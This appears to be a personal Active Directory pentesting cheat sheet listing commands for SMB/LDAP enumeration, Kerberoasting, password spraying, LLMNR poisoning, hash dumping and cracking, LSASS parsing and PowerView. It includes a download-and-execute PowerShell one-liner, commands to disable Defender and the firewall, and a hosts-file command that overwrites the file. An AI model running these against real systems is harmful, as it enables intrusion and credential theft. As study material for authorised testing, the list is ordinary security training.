# Basic Enumeration:
- `Nmap -sn <ip address>`
- `sudo nmap -sC -sV -Pn -p- <IP> -v`

-  If **SMB** open use:
	-  `CrackMapExec smb <ip>`
	-  `nmap -Pn --script smb-enum* -p139,445 <ip>`
	-  `nmap -Pn --script smb-vuln* -p139,445 <ip>`

- After finding the Host add it to /etc/hosts
	- `sudo echo "(ip) (hostname)" > /etc/hosts`

# TOOLS 
## SMB Enumeration 
### SMBclient
- `smbclient -U (user) //(ip)/(folder name)`
- `smbclient -N -L \\\\<ip>` (for Null authentication)

### SMBmap
- `smbmap -H <ip>`
- **For Guest Login**
	- `smbmap -u guest -H 10.10.10.192`
### For Mounting SMB shares
- `mount -t cifs '//<ip>/<share>' /mnt` 

## Domain Enumerations Tools
### Windapsearch 
- For Enumerating users
	- `python3 windapsearch -d <Domain Name> --dc-ip <ip> -U `
	- `python3 windapsearch -d <Domain Name> --dc-ip <ip> -u "domain\\username" -p "password" -U `
- For Enumerating Groups 
	- `python3 windapsearch -d <Domain Name> --dc-ip <Domain Controller IP> -u "domain\\username" -p "password" -G`
	
### Enum4Linux
- For enumerating everything
	- `enum4linux -a <ip>`
	- `enum4linux -u username -p password -a <IP>.`
### LDAP Search
- `ldapsearch -h <ip> -p 389 -x -b "dc=htb,dc=local"`
- `ldapsearch -x -h <hostname> -s base naming context`
- **Check the account lockout policy**
	-  `ldapsearch -D '<domain>\<user>' -w '<password>' -p 389 -h <ip> -b "dc=<domain>,dc=local" -s sub "*" | grep lockoutThreshold`
### GetADUsers.py
- `python3 GetADUsers.py -all <domain.local>/<user>:<password> -dc-ip <ip>`
### Kerbrute
-  `./kerbrute.sh userenum -d <domain> <wordlist>`
- `./kerbrute.sh passwordspray --dc <ip> -d <domain> <user_list> <password>`
### GetUserSPNs.py (Kerberoasting)
- `GetUserSPNs.py -request -dc-ip <domain controller's ip> .local/<user>`
- See if any user has Kerberos pre-authentication disabled
	- `GetNPUsers.py <domain.local>/ -no-pass -usersfile users.txt -dc-ip <ip> | grep -v 'KDC_ERR_C_PRINCIPAL_UNKNOWN'`
### Secretsdump.py 	
- `python3 secretsdump.py test.local/(user):(password)@(ip)`
> Retrieves all of the password hashes that this user account (that is synced with the domain controller) has to offer.

### Responder
- LLMNR Poisoning	
- Key flaw is that the services utilize a user's username and NTLMv2 hash when appropriately responded to LLMNR Posioning is performed through a tool called Responder.
- Checks for a very common misconfiguration within AD, which results in the ability to conduct WPAD and NBT-NS poisoning
-  `python responder.py -I (interface) -rwd`

## Hashcat (For password Cracking)
- `hashcat -m 5600 <hash> <wordlist>`
> -m is module for NTLMv2 Hash

## CrackMapExec (All in one Tool)
- `crackmapexec smb (ip) -u (username) -p (passwords)` (provide wordlist for brute forcing)
-  `crackmapexec smb (ip) -u (user) -p (password)`
-  `crackmapexec winrm (ip) -u (user) -p (password)`
-  `crackmapexec smb (ip) -u (user) -p (password) --shares (checking shares)`
-  `crackmapexec smb (ip) -u (user) -p (password) --pas-pol (checking password policy)`
-  `crackmapexec smb (ip) -u (user) -p (password) --shares -M spider-plus (dumps all the readable data from shares)`
- For executing commands : `crackmapexec (ip) -u (user) -p (password) -x/X <Command> (-x = cmd, -X= Powershell)`
- `CrackMapExec winrm (ip) -u (user) -p (password) --shares for checking the Remote Shares for the user`
> (Always Check Shares that is not default.)

## Privillege Escalation and Exploitation:
- Use BloodHound for mapping out the domain in a graph and reveals relationships that are both intended and not intended.
- First for gathering data need to upload Bloodhound.exe in the victims's computer and execute it. 
path (BloodHound\ resources\ app\ Ingestors)
	
# LSASS ( LocalSecurity Authority Subsystem Service)
>  It stores credentials in memory on behalf of a userthat has an active (or recently active) session. This allows the user to access network resources without re-typing their credentials for each service. LSASS may store credentials in multiple forms, including reversibly encrypted password, Kerberos tickets, NT hash, LM hash, DPAPI keys,and Smartcard PIN
- **pypykatz**
	> extracted lsass.DMP file to retrieve NT hashes.
	- `pip3 install pypykatz`
	- `pypykatz lsa minidump lsass.DMP`
	
# Powershell Commands
- **For Download**
- `IEX(New-Object Net.Webclient).downloadstring('<ip>/file')`
**To check whitelisted file paths from AV**
- `reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"`

# Domian Enumeration
Using PowerView (https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1)

- **Disabling Monitoring and Antivirus**
	- `Set-MpPrefrence -RealTimeMonitoring $true`
	- `Set-MpPrefrence -DisableIOAVprotection $true`
	 - `netsh advfirewall set all profiles state off`
	- `Get-Domain`
	- `Get-DomainSID`
	> Domain policy (security policy that is specifically applied to a given domain or set of computers or drives in a given system.)
	- `Get-DomainPolicy`
- **Domain controller**
	- `Get-DomainController`  
	- `Get-DomainController -Domain (DomainName)`
- **Domain Users**
    - `Get-DomainUser` 
    - `Get-DomainUser | select cn`
    - `Get-DomainUser -Identity (username)` (properities for user)
- **Domain computers**
    - `Get-NetComputer| select name`
    - `Get-NetComputer -OperatingSystem "*Server 2016*" | select name ,operatingsystem |Format-List`
- **Domain Groups**
    - `Get-NetGroup | select name`
    - `Get-NetGroup -Domain (targetdomain) | select name`
    - `Get-NetGroup "*admins*" | select name`
- **Domain Local Group**
    - `Get-NetLocalGroup`
    - `Get-NetLocalGroupMember -GroupName Administrators | Select-Object MemberName, IsGroup, IsDomain`
- **Shares** 
    - `Invoke-ShareFinder  -Verbose`
    - `Find-DomainShare -CheckShareAccess`
	
## AD User Commands 
- **Adding a user to AD and set attributes**
	- `New-ADUser -Name "first last" -Accountpassword (Read-Host -AsSecureString "Super$ecurePassword!") -Enabled $true -OtherAttributes @{'title'="Analyst";'mail'="f.last@domain.com"}`
- **Setting the password of an AD user to the password specified**
	-  `Set-ADAccountPassword -Identity <'name'> -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "NewP@ssw0rdReset!" -Force)`

## AD Groups Command
- **Creating a new security group named "name" with the accompanying attributes**
	- `New-ADGroup -Name "name" -SamAccountName analysts -GroupCategory Security -GroupScope Global -DisplayName "Security Analysts" -Path "CN=Users,DC=domain,DC=local" -Description "Members of this group are Security Analysts under the IT OU"`
- **Adding an AD user to the group specified**
	- `Add-ADGroupMember -Identity 'group name' -Members 'ACepheus,OStarchaser,ACallisto'`

## AD Computer Commands
- **Adding a new computer to the domain using the credentials specified**
	- `Add-Computer -DomainName 'INLANEFREIGHT.LOCAL' -Credential 'INLANEFREIGHT\HTB-student_adm' -Restart`
- **Remotely adding a computer to a domain**
	- `Add-Computer -ComputerName 'name' -LocalCredential '.\localuser' -DomainName 'INLANEFREIGHT.LOCAL' -Credential 'INLANEFREIGHT\htb-student_adm' -Restart`
- **Check for a computer named "name" and view its properties**
	- `Get-ADComputer -Identity "name" -Properties * | select CN,CanonicalName,IPv4Address`
	
